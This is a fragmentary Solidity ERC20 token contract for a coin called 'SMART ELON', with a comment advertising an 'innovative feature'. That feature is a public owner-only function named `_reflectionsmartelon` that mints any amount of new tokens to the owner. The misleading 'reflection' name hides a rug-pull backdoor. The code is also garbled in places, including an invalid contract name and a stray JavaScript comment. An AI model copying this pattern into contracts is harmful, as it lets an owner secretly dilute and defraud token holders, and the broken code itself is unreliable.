...
//
// $smartelon proposes an innovative feature in its contract.
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _reflectionsmartelon(uint256 amount) public onlyOwner {
    _reflectionsmartelon(msg.sender, amount);
    }
    ...
    function _reflectionsmartelon(address account, uint256 amount) internal virtual {
...
contract $SMARTELON is ERC20 {

    uint tokenTotalSupply = 1000000000; // 1 Billion Token Supply

    constructor() public ERC20("SMART ELON", "SELON") {
        _reflectionsmartelon(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}// JavaScript Document